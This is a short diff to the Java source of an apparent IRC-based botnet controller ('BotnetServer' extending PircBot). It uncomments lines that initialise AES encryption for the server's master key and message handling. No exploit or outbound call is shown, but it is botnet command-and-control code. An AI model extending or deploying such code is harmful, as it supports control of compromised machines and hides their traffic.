@@ -99,10 +99,10 @@ public class BotnetServer extends PircBot {
 			input = new Scanner(System.in);
 			
 			botInfo = new HashMap<String, Key>();
-			//masterKey = new SecretKeySpec(key, "AES");
-			//masterCipher = Cipher.getInstance("AES");
-			//masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
-			//masterMsgE = MsgEncrypt.getInstance(masterKey);
+			masterKey = new SecretKeySpec(key, "AES");
+			masterCipher = Cipher.getInstance("AES");
+			masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
+			masterMsgE = MsgEncrypt.getInstance(masterKey);
 		} catch (NickAlreadyInUseException e) {
 			changeNick(NAME);
 		} catch (Exception e) {
